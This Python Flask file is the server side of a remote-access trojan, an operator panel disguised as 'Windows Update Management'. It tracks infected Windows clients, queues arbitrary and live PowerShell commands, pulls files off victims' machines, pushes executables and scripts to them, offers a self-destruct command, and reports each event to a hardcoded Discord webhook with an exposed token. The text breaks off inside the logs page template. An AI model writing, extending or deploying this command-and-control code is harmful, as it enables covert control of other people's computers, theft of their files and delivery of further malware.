from flask import Flask, request, jsonify, send_from_directory
import threading
import time
import json
import os
import hashlib
import base64
from datetime import datetime
import requests
import glob
import random

# ============================================
# ⚙️ CONFIGURAZIONE
# ============================================
app = Flask(__name__)

# Discord Webhook
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"
CURRENT_VERSION = "7.0-fixed"

# Cartelle
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
for folder in ['results', 'uploads', 'downloads']:
    os.makedirs(os.path.join(BASE_DIR, folder), exist_ok=True)

# Settings
MAX_LOG_FILES = 100
MAX_UPLOAD_SIZE = 50 * 1024 * 1024  # 50MB
FILE_RETENTION_HOURS = 72

# ============================================
# 🧠 CLIENT MANAGER
# ============================================
class ClientManager:
    def __init__(self):
        self.clients = {}
        self.device_to_client = {}
        self.commands_queue = {}
        self.lock = threading.RLock()
        self.client_counter = 1000
        self.file_counter = 1000
    
    def get_or_create_client(self, device_id, client_data):
        with self.lock:
            if device_id in self.device_to_client:
                client_id = self.device_to_client[device_id]
                
                if client_id in self.clients:
                    self.clients[client_id].update(client_data)
                    self.clients[client_id]["last_seen"] = datetime.now()
                    if "active_users" in client_data:
                        self.clients[client_id]["active_users"] = client_data["active_users"]
                else:
                    self.clients[client_id] = {
                        **client_data,
                        "last_seen": datetime.now(),
                        "device_id": device_id
                    }
                
                return client_id
            
            else:
                client_id = f"C{self.client_counter}"
                self.client_counter += 1
                
                self.clients[client_id] = {
                    **client_data,
                    "first_seen": datetime.now(),
                    "last_seen": datetime.now(),
                    "device_id": device_id
                }
                
                self.device_to_client[device_id] = client_id
                
                send_to_discord(
                    "🆕 **Nuovo Client** `{}`\n".format(client_id) +
                    "**Host:** {}\n".format(client_data.get('hostname', 'Unknown')) +
                    "**User:** {}\n".format(client_data.get('username', 'Unknown')) +
                    "**OS:** {}".format(client_data.get('os', 'Unknown'))
                )
                
                return client_id
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                device_id = self.clients[client_id].get('device_id')
                if device_id in self.device_to_client:
                    del self.device_to_client[device_id]
                del self.clients[client_id]
            
            if client_id in self.commands_queue:
                del self.commands_queue[client_id]
    
    def has_command(self, client_id):
        with self.lock:
            return client_id in self.commands_queue and bool(self.commands_queue[client_id])
    
    def list_clients(self):
        with self.lock:
            result = {}
            for cid, info in self.clients.items():
                result[cid] = {
                    "hostname": info.get("hostname", "Unknown"),
                    "username": info.get("username", "Unknown"),
                    "os": info.get("os", "Unknown"),
                    "device_id": info.get("device_id", "Unknown"),
                    "last_seen": info.get("last_seen").isoformat() if info.get("last_seen") else "Unknown",
                    "first_seen": info.get("first_seen").isoformat() if info.get("first_seen") else "Unknown",
                    "active_users": info.get("active_users", [])
                }
            return result
    
    def generate_file_id(self):
        with self.lock:
            file_id = "F{}_{}_{}".format(self.file_counter, int(time.time()), random.randint(1000, 9999))
            self.file_counter += 1
            return file_id

client_manager = ClientManager()

# ============================================
# 🔧 UTILITY FUNCTIONS
# ============================================
def send_to_discord(message):
    """Invia messaggio a Discord"""
    if not DISCORD_WEBHOOK:
        return
    
    try:
        max_length = 1900
        if len(message) > max_length:
            parts = [message[i:i+max_length] for i in range(0, len(message), max_length)]
            for i, part in enumerate(parts[:3]):
                suffix = " [{}/{}]".format(i+1, len(parts)) if len(parts) > 1 else ""
                payload = {"content": "**[SERVER]** {}{}".format(part, suffix)}
                requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
                time.sleep(0.5)
        else:
            payload = {"content": "**[SERVER]** {}".format(message)}
            requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
    except:
        pass

def save_result(data):
    """Salva risultato in results/"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        client_id = data.get('client_id', 'unknown')
        filename = "results/result_{}_{}.json".format(client_id, timestamp)
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        cleanup_old_files()
        return filename
    except Exception as e:
        send_to_discord("❌ Errore salvataggio: {}".format(str(e)[:200]))
        return None

def cleanup_old_files():
    """Pulizia file vecchi"""
    try:
        cutoff = time.time() - (FILE_RETENTION_HOURS * 3600)
        
        for folder in ['results', 'uploads', 'downloads']:
            files = sorted(glob.glob("{}/*".format(folder)), key=os.path.getmtime)
            for f in files:
                if os.path.getmtime(f) < cutoff:
                    try:
                        os.remove(f)
                    except:
                        pass
                    
    except Exception as e:
        print("Cleanup error: {}".format(e))

def sanitize_filename(filename):
    """Rimuove caratteri pericolosi dai nomi file"""
    if not filename:
        return "file"
    
    filename = os.path.basename(filename)
    dangerous_chars = ['<', '>', ':', '"', '|', '?', '*', '\\', '/']
    for char in dangerous_chars:
        filename = filename.replace(char, '_')
    
    return filename

# ============================================
# 🏠 PAGINE WEB
# ============================================
@app.route('/')
def home():
    clients = client_manager.list_clients()
    uploads_count = len(glob.glob("uploads/*"))
    
    clients_html = ""
    for cid, info in clients.items():
        users_badges = " ".join(['<span style="background:#4CAF50;color:white;padding:2px 6px;border-radius:10px;font-size:12px;">{}</span>'.format(u) for u in info.get("active_users", [])[:2]])
        clients_html += "<li><strong>{}</strong> - {} ({}) {}</li>".format(cid, info["hostname"], info["username"], users_badges)
    
    if not clients_html:
        clients_html = "<li>Nessun client connesso</li>"
    
    return """
    <html>
    <head><title>Windows Update Management v{}</title>
    <style>
        body {{ font-family: Arial; margin: 20px; }}
        .card {{ background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }}
        .stats {{ display: flex; gap: 20px; flex-wrap: wrap; }}
        .stat {{ background: white; padding: 15px; border-radius: 8px; flex: 1; min-width: 200px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        a {{ color: #007bff; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
    </style>
    </head>
    <body>
    <h1>🖥️ Windows Update Management v{}</h1>
    
    <div class="card">
        <div class="stats">
            <div class="stat">
                <h3>👥 Client Attivi</h3>
                <p style="font-size: 32px; font-weight: bold; color: #007bff;">{}</p>
            </div>
            <div class="stat">
                <h3>📊 Log Files</h3>
                <p style="font-size: 32px; font-weight: bold; color: #28a745;">{}</p>
            </div>
            <div class="stat">
                <h3>📥 File Uploads</h3>
                <p style="font-size: 32px; font-weight: bold; color: #ff6b6b;">{}</p>
            </div>
        </div>
        
        <div style="margin-top: 30px; text-align: center;">
            <p><a href="/admin" style="background: #007bff; color: white; padding: 12px 25px; border-radius: 5px; display: inline-block; font-size: 16px; margin: 5px;">📋 Pannello Admin</a></p>
            <p><a href="/logs" style="background: #28a745; color: white; padding: 12px 25px; border-radius: 5px; display: inline-block; font-size: 16px; margin: 5px;">📄 Visualizza Log</a></p>
            <p><a href="/uploads" style="background: #ff6b6b; color: white; padding: 12px 25px; border-radius: 5px; display: inline-block; font-size: 16px; margin: 5px;">📁 File Scaricati</a></p>
        </div>
    </div>
    
    <div class="card">
        <h3>Client Connessi:</h3>
        <ul>{}</ul>
    </div>
    </body>
    </html>
    """.format(
        CURRENT_VERSION,
        CURRENT_VERSION,
        len(clients),
        len(glob.glob('results/*.json')),
        uploads_count,
        clients_html
    )

@app.route('/admin')
def admin_panel():
    """Pannello admin"""
    clients = client_manager.list_clients()
    
    clients_options = ""
    for client_id, info in clients.items():
        display = "{} - {} ({})".format(client_id, info['hostname'], info['username'])
        clients_options += '<option value="{}">{}</option>'.format(client_id, display)
    
    all_users_set = set(['SYSTEM'])
    for client_id, info in clients.items():
        for user in info.get('active_users', []):
            if user and user.strip():
                all_users_set.add(user)
    
    all_users = sorted(list(all_users_set))
    
    clients_rows = ""
    for client_id, info in clients.items():
        last_seen = info['last_seen']
        if 'T' in last_seen:
            last_seen = last_seen.split('T')[1][:8]
        
        first_seen = info.get('first_seen', 'N/A')
        if 'T' in str(first_seen):
            first_seen = str(first_seen).split('T')[0]
        
        active_users = info.get('active_users', [])
        user_badge = ""
        if active_users:
            user_count = len(active_users)
            user_badge = ' <span style="background:#4CAF50;color:white;padding:2px 6px;border-radius:10px;font-size:12px;">👤{}</span>'.format(user_count)
        
        users_list = ", ".join(active_users[:5])
        if len(active_users) > 5:
            users_list += "... (+{})".format(len(active_users)-5)
        
        tooltip = ' title="Utenti attivi: {}"'.format(users_list) if active_users else ""
        
        clients_rows += """
        <tr{}>
            <td>{}{}</td>
            <td>{}</td>
            <td>{}</td>
            <td>{}</td>
            <td>{}</td>
            <td>{}</td>
            <td>
                <form action="/api/send_command" method="post" style="display: inline;">
                    <input type="hidden" name="client_id" value="{}">
                    <input type="hidden" name="command" value="get_info">
                    <input type="hidden" name="target_user" value="SYSTEM">
                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #17a2b8; color: white; border: none; border-radius: 3px; cursor: pointer;">Info</button>
                </form>
                <form action="/api/send_command" method="post" style="display: inline;">
                    <input type="hidden" name="client_id" value="{}">
                    <input type="hidden" name="command" value="self_destruct">
                    <input type="hidden" name="target_user" value="SYSTEM">
                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer;">💣</button>
                </form>
                <form action="/api/remove_client" method="post" style="display: inline;">
                    <input type="hidden" name="client_id" value="{}">
                    <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #6c757d; color: white; border: none; border-radius: 3px; cursor: pointer;">🗑️</button>
                </form>
            </td>
        </tr>
        """.format(
            tooltip,
            client_id,
            user_badge,
            info['hostname'],
            info['username'],
            info['os'],
            first_seen,
            last_seen,
            client_id,
            client_id,
            client_id
        )
    
    if not clients_rows:
        clients_rows = '<tr><td colspan="7" style="text-align: center; padding: 20px;">Nessun client connesso</td></tr>'
    
    user_options = ""
    for user in all_users:
        selected = " selected" if user == "SYSTEM" else ""
        user_options += '<option value="{}"{}>{}{}</option>'.format(
            user, selected, user, " (tutti)" if user == "SYSTEM" else ""
        )
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel - v{}</title>
        <style>
            body {{ font-family: Arial; margin: 20px; background: #f5f5f5; }}
            .section {{ background: white; margin: 20px 0; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
            button {{ padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; margin: 2px; }}
            .btn-info {{ background: #17a2b8; color: white; }}
            .btn-danger {{ background: #dc3545; color: white; }}
            .btn-secondary {{ background: #6c757d; color: white; }}
            .btn-success {{ background: #28a745; color: white; }}
            table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
            th, td {{ border: 1px solid #dee2e6; padding: 10px; text-align: left; }}
            th {{ background: #f8f9fa; }}
            tr:hover {{ background: #f5f5f5; }}
            input, select, textarea {{ width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ced4da; border-radius: 4px; }}
            .nav {{ margin-bottom: 20px; }}
            .nav a {{ margin-right: 15px; color: #007bff; text-decoration: none; }}
            .global-config {{ background: #e8f4fc; padding: 15px; margin-bottom: 20px; border-radius: 5px; border: 1px solid #b3d9ff; }}
        </style>
    </head>
    <body>
        <div class="nav">
            <a href="/">🏠 Home</a>
            <a href="/logs">📄 Log</a>
            <a href="/uploads">📁 Uploads</a>
            <strong>📋 Admin Panel</strong>
        </div>
        
        <h2>Windows Update Management Panel v{}</h2>
        
        <!-- Configurazione Globale Utente -->
        <div class="global-config">
            <h3 style="margin-top: 0;">🎯 Configurazione Target Utente</h3>
            <p>Seleziona l'utente target per tutti i comandi:</p>
            
            <select id="globalUserTarget" style="padding: 8px; min-width: 250px;">
                {}
            </select>
            
            <button onclick="applyGlobalUser()" class="btn-success" style="margin-left: 10px;">
                Applica a Tutti i Form
            </button>
            
            <div id="globalUserStatus" style="margin-top: 10px; font-size: 14px; color: #666;">
                Stato: <strong>SYSTEM (tutti gli utenti)</strong>
            </div>
        </div>
        
        <!-- Comandi Predefiniti -->
        <div class="section">
            <h3>📋 Comandi Predefiniti</h3>
            <form action="/api/send_command" method="post">
                <label>Client:</label>
                <select name="client_id" required>
                    <option value="">Seleziona client...</option>
                    {}
                </select>
                
                <input type="hidden" name="target_user" value="SYSTEM">
                
                <label>Comando:</label>
                <select name="command" required>
                    <option value="systeminfo">System Information</option>
                    <option value="list_files">List Files</option>
                    <option value="active_users">Active Users</option>
                    <option value="get_info">Client Info</option>
                    <option value="self_destruct">💣 Self Destruct</option>
                </select>
                
                <button type="submit" class="btn-success">Invia Comando</button>
            </form>
        </div>
        
        <!-- PowerShell Live -->
        <div class="section">
            <h3>⚡ PowerShell Live</h3>
            <form action="/api/send_powershell" method="post">
                <label>Client:</label>
                <select name="client_id" required>
                    <option value="">Seleziona client...</option>
                    {}
                </select>
                
                <input type="hidden" name="target_user" value="SYSTEM">
                
                <label>Comando PowerShell:</label>
                <textarea name="command" rows="3" placeholder="Get-Process | Select -First 5" required></textarea>
                
                <button type="submit" class="btn-success">Esegui PowerShell</button>
            </form>
        </div>
        
        <!-- Download File (Client -> Server) -->
        <div class="section">
            <h3>📥 Download File (Client → Server)</h3>
            <form action="/api/request_download" method="post">
                <label>Client:</label>
                <select name="client_id" required>
                    <option value="">Seleziona client...</option>
                    {}
                </select>
                
                <input type="hidden" name="target_user" value="SYSTEM">
                
                <label>Percorso file sul client:</label>
                <input type="text" name="filepath" placeholder="C:\\\\Users\\\\{{user}}\\\\Desktop\\\\file.txt" required>
                
                <button type="submit" class="btn-success">Richiedi Download</button>
            </form>
        </div>
        
        <!-- Upload File (Server -> Client) -->
        <div class="section">
            <h3>📤 Upload File (Server → Client)</h3>
            <form action="/api/prepare_upload" method="post">
                <label>Client:</label>
                <select name="client_id" required>
                    <option value="">Seleziona client...</option>
                    {}
                </select>
                
                <input type="hidden" name="target_user" value="SYSTEM">
                
                <label>File sul server (dalla cartella downloads/):</label>
                <input type="text" name="server_filename" placeholder="file.txt" required>
                
                <label>Destinazione sul client:</label>
                <input type="text" name="client_path" placeholder="C:\\\\Users\\\\{{user}}\\\\Desktop\\\\file.txt" required>
                
                <button type="submit" class="btn-success">Prepara Upload</button>
            </form>
            <p style="font-size: 12px; color: #666; margin-top: 10px;">
                📁 I file devono essere nella cartella <code>downloads/</code> del server
            </p>
        </div>
        
        <!-- Client Attivi -->
        <div class="section">
            <h3>📊 Client Attivi ({})</h3>
            <table>
                <tr>
                    <th>ID</th>
                    <th>Hostname</th>
                    <th>User</th>
                    <th>OS</th>
                    <th>Prima connessione</th>
                    <th>Ultimo visto</th>
                    <th>Azioni</th>
                </tr>
                {}
            </table>
        </div>
        
        <script>
            function applyGlobalUser() {{
                const targetUser = document.getElementById('globalUserTarget').value;
                
                document.querySelectorAll('input[name="target_user"]').forEach(input => {{
                    input.value = targetUser;
                }});
                
                document.getElementById('globalUserStatus').innerHTML =
                    "Stato: <strong>" + targetUser + " (" + (targetUser === 'SYSTEM' ? 'tutti gli utenti' : 'utente specifico') + ")</strong>";
                
                sessionStorage.setItem('globalTargetUser', targetUser);
                
                alert("✅ Tutti i prossimi comandi saranno inviati a: " + targetUser);
            }}
            
            document.addEventListener('DOMContentLoaded', function() {{
                const saved = sessionStorage.getItem('globalTargetUser');
                if (saved) {{
                    document.getElementById('globalUserTarget').value = saved;
                    applyGlobalUser();
                }}
            }});
        </script>
    </body>
    </html>
    '''.format(
        CURRENT_VERSION,
        CURRENT_VERSION,
        user_options,
        clients_options,
        clients_options,
        clients_options,
        clients_options,
        len(clients),
        clients_rows
    )

# ... (continua con tutte le route API - ho rimosso CORS e secure_filename)

# ============================================
# 🔄 API ENDPOINTS (semplificati)
# ============================================
@app.route('/api/register', methods=['POST'])
def register_client():
    try:
        data = request.json
        
        if not data or 'device_id' not in data:
            return jsonify({"status": "error", "message": "device_id required"}), 400
        
        active_users = []
        if 'active_users' in data:
            if isinstance(data['active_users'], list):
                active_users = data['active_users']
            elif isinstance(data['active_users'], str):
                active_users = [u.strip() for u in data['active_users'].split(',') if u.strip()]
        
        data['active_users'] = active_users
        
        device_id = data['device_id']
        client_id = client_manager.get_or_create_client(device_id, data)
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "message": "Client registered"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/heartbeat', methods=['GET'])
def heartbeat():
    try:
        client_id = request.args.get('client_id')
        device_id = request.args.get('device_id')
        current_user = request.args.get('current_user', '')
        active_users_str = request.args.get('active_users', '')
        
        if not client_id or not device_id:
            return jsonify({"status": "error", "message": "Missing params"}), 400
        
        active_users = []
        if active_users_str:
            active_users = [u.strip() for u in active_users_str.split(',') if u.strip()]
        
        with client_manager.lock:
            if client_id not in client_manager.clients:
                return jsonify({"status": "reregister", "message": "Client not found"}), 404
            
            client_manager.clients[client_id]["last_seen"] = datetime.now()
            if current_user:
                client_manager.clients[client_id]["username"] = current_user
            if active_users:
                client_manager.clients[client_id]["active_users"] = active_users
        
        if client_manager.has_command(client_id):
            return jsonify({"status": "command_available", "message": "Command waiting"})
        else:
            return jsonify({"status": "ok", "message": "Heartbeat received"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/get_command', methods=['GET'])
def get_command():
    try:
        client_id = request.args.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"}), 400
        
        command = client_manager.get_command(client_id)
        
        if command:
            send_to_discord("📤 Invio comando a `{}`: `{}`".format(client_id, command[:100]))
            return jsonify({"status": "success", "command": command})
        else:
            return jsonify({"status": "no_command", "message": "No commands"})
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/results', methods=['POST'])
def receive_results():
    try:
        data = request.json
        
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        client_id = data.get('client_id')
        command = data.get('command', 'unknown')
        results = data.get('results', {})
        
        filename = save_result(data)
        
        if isinstance(results, dict) and 'error' not in results:
            result_preview = str(results)[:200]
            send_to_discord(
                "📊 **Risultati da** `{}`\n".format(client_id) +
                "**Comando:** `{}`\n".format(command) +
                "**Anteprima:** {}...".format(result_preview)
            )
        
        return jsonify({"status": "success", "message": "Results received"})
        
    except Exception as e:
        send_to_discord("❌ Errore ricezione risultati: {}".format(str(e)[:200]))
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/send_command', methods=['POST'])
def send_command():
    try:
        client_id = request.form.get('client_id')
        command = request.form.get('command')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not client_id or not command:
            return "Errore: parametri mancanti", 400
        
        final_command = command
        if target_user != "SYSTEM":
            final_command = "user_{}:{}".format(target_user, command)
        
        client_manager.add_command(client_id, final_command)
        
        send_to_discord(
            "🌐 Comando `{}` inviato a `{}`".format(command, client_id) +
            (" (utente: {})".format(target_user) if target_user != "SYSTEM" else "")
        )
        
        return '''
        <h3>✅ Comando Inviato!</h3>
        <p>Il comando è stato accodato e verrà eseguito al prossimo heartbeat del client.</p>
        <p><a href="/admin">↶ Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return "Errore: {}".format(str(e)), 500

@app.route('/api/send_powershell', methods=['POST'])
def send_powershell():
    try:
        client_id = request.form.get('client_id')
        ps_command = request.form.get('command')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not client_id or not ps_command:
            return "Errore: parametri mancanti", 400
        
        final_command = "powershell_live:{}".format(ps_command)
        if target_user != "SYSTEM":
            final_command = "user_{}:powershell_live:{}".format(target_user, ps_command)
        
        client_manager.add_command(client_id, final_command)
        
        send_to_discord(
            "⚡ PowerShell inviato a `{}`".format(client_id) +
            (" (utente: {})".format(target_user) if target_user != "SYSTEM" else "")
        )
        
        return '''
        <h3>✅ PowerShell Inviato!</h3>
        <p>Il comando PowerShell è stato accodato.</p>
        <p><a href="/admin">↶ Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return "Errore: {}".format(str(e)), 500

@app.route('/api/request_download', methods=['POST'])
def request_download():
    try:
        client_id = request.form.get('client_id')
        filepath = request.form.get('filepath')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not client_id or not filepath:
            return "Errore: parametri mancanti", 400
        
        command = "download_file:{}".format(filepath)
        if target_user != "SYSTEM":
            command = "user_{}:{}".format(target_user, command)
        
        client_manager.add_command(client_id, command)
        
        send_to_discord(
            "📥 Download richiesto da `{}`".format(client_id) +
            (" (utente: {})".format(target_user) if target_user != "SYSTEM" else "") +
            ": {}".format(filepath)
        )
        
        return '''
        <h3>✅ Download Richiesto!</h3>
        <p>Il client scaricherà il file al prossimo heartbeat e lo invierà al server.</p>
        <p><a href="/admin">↶ Torna al Panel</a></p>
        '''
        
    except Exception as e:
        return "Errore: {}".format(str(e)), 500

@app.route('/api/upload_file', methods=['POST'])
def handle_file_upload():
    """Riceve file dal client"""
    try:
        client_id = request.form.get('client_id', 'unknown')
        original_path = request.form.get('original_path', '')
        target_user = request.form.get('target_user', '')
        
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file part"}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({"status": "error", "message": "No selected file"}), 400
        
        file.seek(0, 2)
        file_size = file.tell()
        file.seek(0)
        
        if file_size > MAX_UPLOAD_SIZE:
            return jsonify({"status": "error", "message": "File troppo grande (max {}MB)".format(MAX_UPLOAD_SIZE/1024/1024)}), 400
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_filename = sanitize_filename(file.filename)
        save_filename = "{}_{}_{}".format(timestamp, client_id, safe_filename)
        save_path = os.path.join("uploads", save_filename)
        
        file.save(save_path)
        
        metadata = {
            "client_id": client_id,
            "operation": "download",
            "original_filename": file.filename,
            "original_path": original_path,
            "saved_filename": save_filename,
            "target_user": target_user,
            "size": file_size,
            "timestamp": datetime.now().isoformat()
        }
        
        metadata_filename = "upload_{}_{}.json".format(timestamp, client_id)
        with open(os.path.join("results", metadata_filename), 'w') as f:
            json.dump(metadata, f, indent=2)
        
        send_to_discord(
            "📥 **File ricevuto da** `{}`\n".format(client_id) +
            "**File:** `{}`\n".format(file.filename) +
            "**Percorso originale:** `{}`\n".format(original_path) +
            "**Utente:** {}\n".format(target_user if target_user else 'SYSTEM') +
            "**Dimensione:** {:.1f} KB".format(file_size / 1024)
        )
        
        return jsonify({
            "status": "success",
            "message": "File uploaded successfully",
            "saved_as": save_filename,
            "size": file_size
        })
        
    except Exception as e:
        send_to_discord("❌ Errore upload file: {}".format(str(e)[:200]))
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/prepare_upload', methods=['POST'])
def prepare_upload():
    """Prepara un file per il download dal client"""
    try:
        client_id = request.form.get('client_id')
        server_filename = request.form.get('server_filename')
        client_path = request.form.get('client_path')
        target_user = request.form.get('target_user', 'SYSTEM')
        
        if not all([client_id, server_filename, client_path]):
            return "Errore: parametri mancanti", 400
        
        server_filename = sanitize_filename(server_filename)
        file_path = os.path.join("downloads", server_filename)
        
        if not os.path.exists(file_path):
            return "Errore: file '{}' non trovato nella cartella downloads/".format(server_filename), 404
        
        file_id = client_manager.generate_file_id()
        temp_filename = "{}_{}".format(file_id, server_filename)
        temp_path = os.path.join("downloads", temp_filename)
        
        import shutil
        shutil.copy2(file_path, temp_path)
        
        file_url = "/downloads/{}".format(temp_filename)
        full_url = "{}{}".format(request.host_url.rstrip('/'), file_url)
        
        command = "upload_from_server:{}|{}".format(full_url, client_path)
        if target_user != "SYSTEM":
            command = "user_{}:{}".format(target_user, command)
        
        client_manager.add_command(client_id, command)
        
        send_to_discord(
            "📤 Upload preparato per `{}`\n".format(client_id) +
            "**File:** `{}` → `{}`\n".format(server_filename, client_path) +
            "**Utente:** {}".format(target_user if target_user != 'SYSTEM' else 'SYSTEM (tutti)')
        )
        
        return '''
        <h3>✅ Upload Preparato!</h3>
        <p><strong>Client:</strong> <code>{}</code></p>
        <p><strong>File:</strong> <code>{}</code></p>
        <p><strong>Destinazione:</strong> <code>{}</code></p>
        <p><strong>URL Temporaneo:</strong> <code>{}</code></p>
        <p><strong>Utente Target:</strong> {}</p>
        <p><a href="/admin">↶ Torna al Panel</a></p>
        '''.format(
            client_id,
            server_filename,
            client_path,
            full_url,
            target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"
        )
        
    except Exception as e:
        return "Errore: {}".format(str(e)), 500

@app.route('/downloads/<filename>')
def serve_download_file(filename):
    """Serve file per download dai client"""
    try:
        if '..' in filename or '/' in filename:
            return "Access denied", 403
        
        file_path = os.path.join("downloads", filename)
        
        if not os.path.exists(file_path):
            for ext in ['', '.exe', '.txt', '.ps1', '.bat', '.zip']:
                test_path = file_path + ext
                if os.path.exists(test_path):
                    file_path = test_path
                    break
        
        if not os.path.exists(file_path):
            return "File non trovato o scaduto", 404
        
        counter_file = file_path + '.counter'
        try:
            with open(counter_file, 'r') as f:
                count = int(f.read().strip())
        except:
            count = 0
        
        count += 1
        with open(counter_file, 'w') as f:
            f.write(str(count))
        
        if count >= 5:
            try:
                os.remove(file_path)
                os.remove(counter_file)
            except:
                pass
        
        return send_from_directory("downloads", os.path.basename(file_path), as_attachment=True)
        
    except Exception as e:
        return "Errore: {}".format(str(e)), 500

@app.route('/uploads')
def view_uploads():
    """Pagina file scaricati"""
    try:
        upload_files = sorted(glob.glob("uploads/*"), key=os.path.getmtime, reverse=True)
        
        files_list = ""
        for i, file_path in enumerate(upload_files[:50]):
            filename = os.path.basename(file_path)
            size_kb = os.path.getsize(file_path) / 1024
            mtime = datetime.fromtimestamp(os.path.getmtime(file_path))
            
            parts = filename.split('_', 2)
            if len(parts) >= 3:
                timestamp = parts[0]
                client_id = parts[1]
                original_name = '_'.join(parts[2:])
            else:
                client_id = "N/A"
                original_name = filename
            
            files_list += '''
            <tr>
                <td>{}</td>
                <td><a href="/get_upload/{}" download>{}</a></td>
                <td>{}</td>
                <td>{}</td>
                <td>{:.1f} KB</td>
            </tr>
            '''.format(i+1, filename, original_name, client_id, mtime.strftime('%Y-%m-%d %H:%M'), size_kb)
        
        if not files_list:
            files_list = '<tr><td colspan="5" style="text-align: center; padding: 20px; color: #666;">📭 Nessun file scaricato</td></tr>'
        
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>File Scaricati - v{}</title>
            <style>
                body {{ font-family: Arial; margin: 20px; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                tr:hover {{ background-color: #f5f5f5; }}
                .header {{ background: #343a40; color: white; padding: 20px; border-radius: 8px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>📁 File Scaricati dai Client</h1>
                <p><a href="/" style="color: #80bdff;">🏠 Home</a> | <a href="/admin" style="color: #80bdff;">📋 Admin Panel</a></p>
            </div>
            
            <h3>Ultimi 50 file:</h3>
            <table>
                <tr><th>#</th><th>File</th><th>Client ID</th><th>Data/Ora</th><th>Dimensione</th></tr>
                {}
            </table>
        </body>
        </html>
        '''.format(CURRENT_VERSION, files_list)
    except Exception as e:
        return "<h2>Errore caricamento uploads: {}</h2>".format(str(e))

@app.route('/get_upload/<filename>')
def get_upload(filename):
    """Scarica file dalla cartella uploads"""
    try:
        if '..' in filename or '/' in filename:
            return "Access denied", 403
        
        return send_from_directory("uploads", filename, as_attachment=True)
    except Exception as e:
        return "Errore: {}".format(str(e)), 500

@app.route('/logs')
def view_logs():
    """Pagina log"""
    try:
        log_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime, reverse=True)
        
        files_list = ""
        for i, log_file in enumerate(log_files[:50]):
            filename = os.path.basename(log_file)
            size_kb = os.path.getsize(log_file) / 1024
            mtime = datetime.fromtimestamp(os.path.getmtime(log_file))
            
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                client_id = data.get('client_id', 'N/A')
                command = data.get('command', 'N/A')
            except:
                client_id = "Errore lettura"
                command = "N/A"
            
            files_list += '''
            <tr>
                <td>{}</td>
                <td><a href="/view_log/{}">{}</a></td>
                <td>{}</td>
                <td><code>{}{}</code></td>
                <td>{}</td>
                <td>{:.1f} KB</td>
            </tr>
            '''.format(i+1, filename, filename, client_id, command[:30], '...' if len(command) > 30 else '', mtime.strftime('%Y-%m-%d %H:%M'), size_kb)
        
        if not files_list:
            files_list = '<tr><td colspan="6" style="text-align: center; padding: 20px; color: #666;">📭 Nessun log disponibile</td></tr>'
        
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Log Client - v{}</title>
            <style>
                body {{ font-family: Arial; margin: 20px; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                tr:hover {{ background-color: #f5f5f5; }}
                .header {{ background: #343a40; color: white; padding: 20px; border-radius: 8px; }}
                code {{ background: #e8f4fc; padding: 2px 5px; border-radius: 3px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>📄 Log Client</h1>
                <p><a href="/" style="color: #80bdff;">🏠 Home</a> | <a href="/admin" style="color: #80bdff;">📋 Admin Panel</a></p>
            </div>
            
            <h3>Ultimi 50 log:</h3>
            <table>
                <tr><th>#</th><th>File</th><th>Client ID</th><th>Comando</th><th>Data/Ora</th><th>Dimensione</th></tr>
                {}
            </table>
        </body>
        </html>
